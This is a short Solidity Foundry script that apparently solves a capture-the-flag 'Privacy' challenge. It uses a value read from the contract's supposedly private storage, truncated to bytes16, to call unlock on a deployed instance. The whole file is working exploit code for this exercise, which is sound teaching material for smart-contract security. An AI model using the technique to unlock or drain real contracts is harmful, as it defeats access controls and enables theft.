// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Privacy.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();
        Privacy victim = Privacy(0xb526474C20908E9049E8ba1d59165561EbEE02Ea);
        bytes16 key = bytes16(bytes32(0x97352dfeca293416a870ad186bdc453f672afddd657911b03d0de925fc72f2e5));
        victim.unlock(key);
        vm.stopBroadcast();
    }
}